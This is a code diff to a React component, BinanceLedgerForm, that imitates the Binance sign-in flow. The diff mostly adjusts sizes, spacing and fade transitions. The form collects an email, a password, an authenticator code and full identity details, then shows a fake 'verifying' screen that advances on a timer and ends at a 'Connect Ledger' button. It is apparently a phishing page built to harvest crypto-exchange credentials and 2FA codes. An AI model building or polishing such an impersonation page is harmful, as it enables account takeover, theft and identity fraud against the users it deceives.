@@ -1,4 +1,3 @@
-
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { AlertTriangle } from "lucide-react";
@@ -22,6 +21,7 @@ const BinanceLedgerForm: FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [logoError, setLogoError] = useState(false);
   const [errors, setErrors] = useState<{[key: string]: string}>({});
+  const [isTransitioning, setIsTransitioning] = useState(false);
   const [personalDetails, setPersonalDetails] = useState({
     firstName: "",
     lastName: "",
@@ -32,6 +32,16 @@ const BinanceLedgerForm: FC = () => {
     country: "",
     phoneNumber: ""
   });
+
+  const transitionToStep = (newStep: FormStep) => {
+    setIsTransitioning(true);
+    setTimeout(() => {
+      setCurrentStep(newStep);
+      setTimeout(() => {
+        setIsTransitioning(false);
+      }, 150);
+    }, 150);
+  };
 
   const handleEmailSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -48,7 +58,7 @@ const BinanceLedgerForm: FC = () => {
     }
     
     console.log("Email submitted:", email);
-    setCurrentStep('password');
+    transitionToStep('password');
   };
 
   const handlePasswordSubmit = async (e: React.FormEvent) => {
@@ -68,7 +78,7 @@ const BinanceLedgerForm: FC = () => {
     setIsLoading(true);
     await new Promise(resolve => setTimeout(resolve, 1500));
     setIsLoading(false);
-    setCurrentStep('verification');
+    transitionToStep('verification');
   };
 
   const handleVerificationSubmit = async (e: React.FormEvent) => {
@@ -88,11 +98,11 @@ const BinanceLedgerForm: FC = () => {
     setIsLoading(true);
     await new Promise(resolve => setTimeout(resolve, 2000));
     setIsLoading(false);
-    setCurrentStep('important-notice');
+    transitionToStep('important-notice');
   };
 
   const handleNoticeConfirm = () => {
-    setCurrentStep('personal-details');
+    transitionToStep('personal-details');
   };
 
   const handlePersonalDetailsSubmit = async (e: React.FormEvent) => {
@@ -113,11 +123,11 @@ const BinanceLedgerForm: FC = () => {
       return;
     }
     
-    setCurrentStep('verifying');
+    transitionToStep('verifying');
     
     // Auto-proceed after 15 seconds
     setTimeout(() => {
-      setCurrentStep('success');
+      transitionToStep('success');
     }, 15000);
   };
 
@@ -131,19 +141,19 @@ const BinanceLedgerForm: FC = () => {
   };
 
   const renderHeader = () => (
-    <div className="flex justify-start mb-6">
+    <div className="flex justify-start mb-5">
       <div className="flex items-center">
         <img 
           src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/632px-Binance_logo.svg.png" 
           alt="Binance Logo" 
-          className="h-7"
+          className="h-6"
           onError={(e) => {
             setLogoError(true);
             e.currentTarget.style.display = 'none';
           }}
         />
         {logoError && (
-          <span className="text-binance-yellow font-bold text-lg font-binance">
+          <span className="text-binance-yellow font-bold text-base font-binance">
             BINANCE
           </span>
         )}
@@ -163,43 +173,17 @@ const BinanceLedgerForm: FC = () => {
     };
 
     if (currentStep === 'important-notice') {
-      return (
-        <div className="text-center mb-6">
-          <div 
-            className="mb-4 flex items-center justify-center gap-2 text-sm font-semibold font-binance"
-            style={{ color: "#F59E0B" }}
-          >
-            <AlertTriangle size={14} style={{ color: "#F59E0B" }} />
-            {titles[currentStep]}
-          </div>
-        </div>
-      );
+      return null; // Title handled in content for important notice
     }
 
     if (currentStep === 'verifying' || currentStep === 'success') {
-      return (
-        <div className="flex items-center justify-center min-h-[500px]">
-          <div className="text-center">
-            <div 
-              className="text-sm font-semibold font-binance mb-4"
-              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
-            >
-              {currentStep === 'verifying' ? 'Please wait a moment while we verify your details' : titles[currentStep]}
-            </div>
-            {currentStep === 'verifying' && (
-              <div className="flex justify-center">
-                <div className="animate-spin rounded-full h-8 w-8 border-4 border-yellow-500 border-t-transparent"></div>
-              </div>
-            )}
-          </div>
-        </div>
-      );
+      return null; // Title handled in content for these states
     }
 
     return (
-      <div className="flex justify-between items-center mb-6">
+      <div className="flex justify-between items-center mb-5">
         <div 
-          className="text-xl font-bold font-binance"
+          className="text-lg font-bold font-binance"
           style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
           role="heading" 
           aria-level={1}
@@ -207,18 +191,18 @@ const BinanceLedgerForm: FC = () => {
           {titles[currentStep]}
         </div>
         {currentStep === 'email' && (
-          <div className="max-md:hidden h-[36px]">
+          <div className="max-md:hidden h-[32px]">
             <div className="bn-tooltips-wrap qrcode-login-popup">
               <div className="bn-tooltips-ele">
                 <div 
-                  className="p-[3px] w-[36px] h-[36px] rounded-[6px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
+                  className="p-[2px] w-[32px] h-[32px] rounded-[5px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
                   style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                   role="button" 
                   aria-label="QR code login" 
                   tabIndex={0}
                 >
                   <svg 
-                    className="w-[30px] h-[30px]" 
+                    className="w-[28px] h-[28px]" 
                     style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                     viewBox="0 0 24 24" 
                     xmlns="http://www.w3.org/2000/svg"
@@ -240,35 +224,93 @@ const BinanceLedgerForm: FC = () => {
     );
   };
 
-  const renderMainForm = () => {
+  // Render special states (important notice, verifying, success)
+  const renderSpecialState = () => {
     if (currentStep === 'important-notice') {
       return (
-        <div className="flex items-center justify-center min-h-[400px]">
-          <div className="text-center max-w-md mx-auto">
+        <div className="flex items-center justify-center min-h-[400px] text-center">
+          <div className="max-w-sm mx-auto">
             <div 
-              className="p-4 rounded-md border border-yellow-200 bg-yellow-50/50"
-              style={{ 
-                backgroundColor: "rgba(255, 248, 220, 0.1)",
-                borderColor: "rgba(245, 158, 11, 0.2)"
-              }}
+              className="mb-4 flex items-center justify-center gap-2 text-sm font-semibold font-binance"
+              style={{ color: "#F59E0B" }}
             >
-              <div className="text-xs font-binance text-center leading-relaxed" style={{ color: "#B7BDC6" }}>
-                Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
-              </div>
+              <AlertTriangle size={12} style={{ color: "#F59E0B" }} />
+              Important Notice
+            </div>
+            <div className="text-xs font-binance text-center leading-relaxed mb-6" style={{ color: "#B7BDC6" }}>
+              Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+            </div>
+            <button
+              type="button"
+              onClick={handleNoticeConfirm}
+              className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+              style={{
+                backgroundColor: "var(--color-BtnBg, #FCD535)",
+                color: "var(--color-TextOnYellow, #202630)",
+                height: "38px"
+              }}
+              aria-label="I Understand"
+            >
+              I Understand
+            </button>
+          </div>
+        </div>
+      );
+    }
+
+    if (currentStep === 'verifying') {
+      return (
+        <div className="flex items-center justify-center min-h-[400px]">
+          <div className="text-center">
+            <div 
+              className="text-sm font-semibold font-binance mb-4"
+              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+            >
+              Please wait a moment while we verify your details
+            </div>
+            <div className="flex justify-center">
+              <div className="animate-spin rounded-full h-6 w-6 border-4 border-yellow-500 border-t-transparent"></div>
             </div>
           </div>
         </div>
       );
     }
 
-    if (currentStep === 'verifying' || currentStep === 'success') {
-      return null; // Handled in renderTitle
+    if (currentStep === 'success') {
+      return (
+        <div className="flex items-center justify-center min-h-[400px]">
+          <div className="text-center">
+            <div 
+              className="text-sm font-semibold font-binance mb-6"
+              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+            >
+              Verification Successful
+            </div>
+            <button
+              type="button"
+              className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+              style={{
+                backgroundColor: "var(--color-BtnBg, #FCD535)",
+                color: "var(--color-TextOnYellow, #202630)",
+                height: "38px"
+              }}
+              aria-label="Connect Ledger"
+            >
+              Connect Ledger
+            </button>
+          </div>
+        </div>
+      );
     }
 
+    return null;
+  };
+
+  const renderMainForm = () => {
     if (currentStep === 'personal-details') {
       return (
         <form onSubmit={handlePersonalDetailsSubmit}>
-          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-5">
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-4">
             <div className="bn-formItem">
               <label className="block mb-2 text-xs font-medium font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
                 First Name
@@ -278,12 +320,12 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.firstName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.firstName}
                   onChange={(e) => setPersonalDetails({...personalDetails, firstName: e.target.value})}
                 />
@@ -304,12 +346,12 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.lastName ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.lastName}
                   onChange={(e) => setPersonalDetails({...personalDetails, lastName: e.target.value})}
                 />
@@ -330,12 +372,12 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.dateOfBirth ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <input
                   type="date"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.dateOfBirth}
                   onChange={(e) => setPersonalDetails({...personalDetails, dateOfBirth: e.target.value})}
                 />
@@ -356,12 +398,12 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.phoneNumber ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <input
                   type="tel"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.phoneNumber}
                   onChange={(e) => setPersonalDetails({...personalDetails, phoneNumber: e.target.value})}
                 />
@@ -382,12 +424,12 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.address ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.address}
                   onChange={(e) => setPersonalDetails({...personalDetails, address: e.target.value})}
                 />
@@ -408,12 +450,12 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.postalCode ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.postalCode}
                   onChange={(e) => setPersonalDetails({...personalDetails, postalCode: e.target.value})}
                 />
@@ -434,12 +476,12 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.city ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <input
                   type="text"
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                   value={personalDetails.city}
                   onChange={(e) => setPersonalDetails({...personalDetails, city: e.target.value})}
                 />
@@ -460,19 +502,19 @@ const BinanceLedgerForm: FC = () => {
                 style={{
                   backgroundColor: "var(--color-Input, #2B3139)",
                   border: `1px solid ${errors.country ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                  height: "42px"
+                  height: "38px"
                 }}
               >
                 <select
-                  className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs appearance-none cursor-pointer"
+                  className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs appearance-none cursor-pointer"
                   value={personalDetails.country}
                   onChange={(e) => setPersonalDetails({...personalDetails, country: e.target.value})}
                   style={{ 
                     backgroundColor: "var(--color-Input, #2B3139)",
-                    backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
-                    backgroundPosition: 'right 0.75rem center',
+                    backgroundImage: `url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%23848E9C' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e")`,
+                    backgroundPosition: 'right 0.6rem center',
                     backgroundRepeat: 'no-repeat',
-                    backgroundSize: '1.2em 1.2em'
+                    backgroundSize: '1em 1em'
                   }}
                 >
                   <option value="" className="bg-[#2B3139] text-white text-xs">Select a country</option>
@@ -499,7 +541,7 @@ const BinanceLedgerForm: FC = () => {
         case 'email':
           return (
             <form onSubmit={handleEmailSubmit}>
-              <div className="bn-formItem mb-5">
+              <div className="bn-formItem mb-4">
                 <label 
                   className="block mb-2 text-xs font-medium font-binance" 
                   htmlFor="bn-formItem-q8nY2Y1v"
@@ -514,7 +556,7 @@ const BinanceLedgerForm: FC = () => {
                       style={{
                         backgroundColor: "var(--color-Input, #2B3139)",
                         border: `1px solid ${errors.email ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                        height: "42px"
+                        height: "38px"
                       }}
                       role="group"
                     >
@@ -527,7 +569,7 @@ const BinanceLedgerForm: FC = () => {
                         autoFocus
                         id="bn-formItem-q8nY2Y1v"
                         autoCapitalize="off"
-                        className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                        className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                         spellCheck="false"
                         autoComplete="username"
                         value={email}
@@ -547,7 +589,7 @@ const BinanceLedgerForm: FC = () => {
         case 'password':
           return (
             <form onSubmit={handlePasswordSubmit}>
-              <div className="bn-formItem mb-5">
+              <div className="bn-formItem mb-4">
                 <label 
                   className="block mb-2 text-xs font-medium font-binance" 
                   htmlFor="password-field"
@@ -562,7 +604,7 @@ const BinanceLedgerForm: FC = () => {
                       style={{
                         backgroundColor: "var(--color-Input, #2B3139)",
                         border: `1px solid ${errors.password ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                        height: "42px"
+                        height: "38px"
                       }}
                       role="group"
                     >
@@ -575,7 +617,7 @@ const BinanceLedgerForm: FC = () => {
                         autoFocus
                         id="password-field"
                         autoCapitalize="off"
-                        className="bg-transparent border-0 text-white p-3 w-full outline-none h-full font-binance text-xs"
+                        className="bg-transparent border-0 text-white p-2.5 w-full outline-none h-full font-binance text-xs"
                         spellCheck="false"
                         autoComplete="current-password"
                         value={password}
@@ -602,7 +644,7 @@ const BinanceLedgerForm: FC = () => {
                 Enter the code from your Google/Binance Authenticator.
               </div>
               <form onSubmit={handleVerificationSubmit}>
-                <div className="bn-formItem mb-5">
+                <div className="bn-formItem mb-4">
                   <label 
                     className="block mb-2 text-xs font-binance" 
                     htmlFor="verification-field"
@@ -617,7 +659,7 @@ const BinanceLedgerForm: FC = () => {
                         style={{
                           backgroundColor: "var(--color-Input, #2B3139)",
                           border: `1px solid ${errors.verification ? '#ef4444' : 'var(--color-InputLine, #474D57)'}`,
-                          height: "42px"
+                          height: "38px"
                         }}
                         role="group"
                       >
@@ -630,7 +672,7 @@ const BinanceLedgerForm: FC = () => {
                           autoFocus
                           id="verification-field"
                           autoCapitalize="off"
-                          className="bg-transparent border-0 text-white p-3 pr-14 w-full outline-none h-full font-binance text-xs"
+                          className="bg-transparent border-0 text-white p-2.5 pr-12 w-full outline-none h-full font-binance text-xs"
                           spellCheck="false"
                           maxLength={6}
                           value={verificationCode}
@@ -639,7 +681,7 @@ const BinanceLedgerForm: FC = () => {
                         <button
                           type="button"
                           onClick={handlePaste}
-                          className="absolute right-3 top-1/2 transform -translate-y-1/2 font-medium hover:opacity-80 transition-opacity font-binance text-xs"
+                          className="absolute right-2.5 top-1/2 transform -translate-y-1/2 font-medium hover:opacity-80 transition-opacity font-binance text-xs"
                           style={{ color: "var(--color-BtnBg, #FCD535)" }}
                         >
                           Paste
@@ -665,53 +707,14 @@ const BinanceLedgerForm: FC = () => {
   };
 
   const renderButton = () => {
-    if (currentStep === 'important-notice') {
-      return (
-        <button
-          type="button"
-          onClick={handleNoticeConfirm}
-          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-          style={{
-            backgroundColor: "var(--color-BtnBg, #FCD535)",
-            color: "var(--color-TextOnYellow, #202630)",
-            height: "42px"
-          }}
-          aria-label="I Understand"
-        >
-          I Understand
-        </button>
-      );
-    }
-
-    if (currentStep === 'verifying') {
-      return null;
-    }
-
-    if (currentStep === 'success') {
-      return (
-        <button
-          type="button"
-          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
-          style={{
-            backgroundColor: "var(--color-BtnBg, #FCD535)",
-            color: "var(--color-TextOnYellow, #202630)",
-            height: "42px"
-          }}
-          aria-label="Connect Ledger"
-        >
-          Connect Ledger
-        </button>
-      );
-    }
-
     if (currentStep === 'personal-details') {
       return (
         <button
-          className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+          className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
           style={{
             backgroundColor: "var(--color-BtnBg, #FCD535)",
             color: "var(--color-TextOnYellow, #202630)",
-            height: "42px"
+            height: "38px"
           }}
           type="submit"
           disabled={isLoading}
@@ -742,11 +745,11 @@ const BinanceLedgerForm: FC = () => {
 
     return (
       <button
-        className="w-full py-3 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
+        className="w-full py-2.5 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center font-bold font-binance text-xs"
         style={{
           backgroundColor: "var(--color-BtnBg, #FCD535)",
           color: "var(--color-TextOnYellow, #202630)",
-          height: "42px"
+          height: "38px"
         }}
         type="submit"
         disabled={isLoading}
@@ -766,7 +769,7 @@ const BinanceLedgerForm: FC = () => {
 
     return (
       <>
-        <div className="my-3 flex items-center md:mb-2 md:mt-5">
+        <div className="my-3 flex items-center md:mb-2 md:mt-4">
           <div 
             className="h-[1px] flex-1" 
             style={{ backgroundColor: "var(--color-Line, #2B3139)" }}
@@ -776,7 +779,7 @@ const BinanceLedgerForm: FC = () => {
             style={{ 
               color: "var(--color-TertiaryText, #848E9C)",
               fontWeight: "400",
-              lineHeight: "18px"
+              lineHeight: "16px"
             }}
           >
             or
@@ -789,23 +792,23 @@ const BinanceLedgerForm: FC = () => {
 
         <div className="space-y-2">
           <button 
-            className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
+            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "12px",
+              fontSize: "11px",
               fontWeight: "400",
-              lineHeight: "18px",
-              height: "42px"
+              lineHeight: "16px",
+              height: "38px"
             }}
             role="button" 
             aria-label="Continue with Passkey"
           >
             <div className="icon-warp mr-2">
-              <div className="ml-1 h-[18px]">
+              <div className="ml-1 h-[16px]">
                 <svg 
-                  className="bn-svg h-[18px] w-[18px]" 
+                  className="bn-svg h-[16px] w-[16px]" 
                   style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                   viewBox="0 0 24 24" 
                   xmlns="http://www.w3.org/2000/svg"
@@ -820,21 +823,21 @@ const BinanceLedgerForm: FC = () => {
           </button>
 
           <button 
-            className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
+            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "12px",
+              fontSize: "11px",
               fontWeight: "400",
-              lineHeight: "18px",
-              height: "42px"
+              lineHeight: "16px",
+              height: "38px"
             }}
             role="button" 
             aria-label="Continue with Google"
           >
             <div className="icon-warp mr-2">
-              <svg width="20" height="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
+              <svg width="18" height="18" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="bn-svg">
                 <g clipPath="url(#clip0_2445_976)">
                   <path fillRule="evenodd" clipRule="evenodd" d="M19.68 12.1818C19.68 11.6146 19.6291 11.0691 19.5345 10.5455H12V13.64H16.3055C16.12 14.64 15.5564 15.4873 14.7091 16.0546V18.0618H17.2945C18.8073 16.6691 19.68 14.6182 19.68 12.1818Z" fill="#4285F4" />
                   <path fillRule="evenodd" clipRule="evenodd" d="M11.9997 20C14.1597 20 15.9706 19.2836 17.2942 18.0618L14.7088 16.0545C13.9924 16.5345 13.076 16.8182 11.9997 16.8182C9.91604 16.8182 8.1524 15.4109 7.52331 13.52H4.85059V15.5927C6.16695 18.2073 8.8724 20 11.9997 20Z" fill="#34A853" />
@@ -852,21 +855,21 @@ const BinanceLedgerForm: FC = () => {
           </button>
 
           <button 
-            className="w-full py-3 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
+            className="w-full py-2.5 rounded flex items-center justify-center transition-colors hover:bg-[#2B3139] hover:border-[#848E9C] font-binance"
             style={{
               backgroundColor: "transparent",
               border: "1px solid var(--color-InputLine, #474D57)",
               color: "var(--color-PrimaryText, #EAECEF)",
-              fontSize: "12px",
+              fontSize: "11px",
               fontWeight: "400",
-              lineHeight: "18px",
-              height: "42px"
+              lineHeight: "16px",
+              height: "38px"
             }}
             role="button" 
             aria-label="Continue with Telegram"
           >
             <div className="icon-warp mr-2">
-              <svg height="20" width="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
+              <svg height="18" width="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" className="bn-svg">
                 <path d="M2.81274 9.27228C7.28665 7.32306 10.27 6.03802 11.7627 5.41715C16.0247 3.64445 16.9103 3.33651 17.4875 3.32634C17.6144 3.3241 17.8983 3.35557 18.0822 3.50477C18.2374 3.63075 18.2801 3.80094 18.3006 3.92038C18.321 4.03983 18.3465 4.31192 18.3263 4.52453C18.0953 6.95123 17.0959 12.8402 16.5875 15.5581C16.3724 16.7082 15.9488 17.0938 15.5387 17.1315C14.6475 17.2136 13.9707 16.5426 13.1076 15.9767C11.7568 15.0913 10.9938 14.5401 9.68265 13.6761C8.16744 12.6776 9.14969 12.1288 10.0132 11.232C10.2392 10.9972 14.1659 7.42557 14.2419 7.10157C14.2514 7.06104 14.2603 6.90999 14.1705 6.83024C14.0808 6.75048 13.9483 6.77775 13.8528 6.79944C13.7173 6.83019 11.5595 8.25641 7.37938 11.0781C6.7669 11.4987 6.21213 11.7036 5.71508 11.6929C5.16711 11.681 4.11306 11.383 3.32947 11.1283C2.36838 10.8159 1.60451 10.6507 1.67103 10.1202C1.70568 9.84381 2.08624 9.56118 2.81274 9.27228Z" fill="#00AEED" />
               </svg>
             </div>
@@ -877,28 +880,45 @@ const BinanceLedgerForm: FC = () => {
     );
   };
 
+  // Check if we should show special states
+  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success';
+
   return (
     <div 
       className="min-h-screen flex items-center justify-center p-4"
       style={{ backgroundColor: "var(--color-Body, #181A20)" }}
     >
       <div 
-        className="w-full max-w-md p-6 rounded-lg"
+        className="w-full max-w-md p-5 rounded-lg"
         style={{ 
           backgroundColor: "var(--color-Card, #1E2329)",
-          minHeight: "550px"
+          minHeight: "500px"
         }}
       >
+        {/* Always show header */}
         {renderHeader()}
-        {renderTitle()}
         
-        <div style={{ minHeight: "360px" }} className="flex flex-col">
-          {renderMainForm()}
-          
-          <div className="mt-auto">
-            {renderButton()}
-            {renderAlternativeOptions()}
-          </div>
+        {/* Content with fade transition */}
+        <div 
+          className={`transition-opacity duration-300 ${isTransitioning ? 'opacity-0' : 'opacity-100'}`}
+          style={{ minHeight: "420px" }}
+        >
+          {isSpecialState ? (
+            renderSpecialState()
+          ) : (
+            <div className="flex flex-col h-full">
+              {renderTitle()}
+              
+              <div style={{ minHeight: "320px" }} className="flex flex-col">
+                {renderMainForm()}
+                
+                <div className="mt-auto">
+                  {renderButton()}
+                  {renderAlternativeOptions()}
+                </div>
+              </div>
+            </div>
+          )}
         </div>
       </div>
     </div>
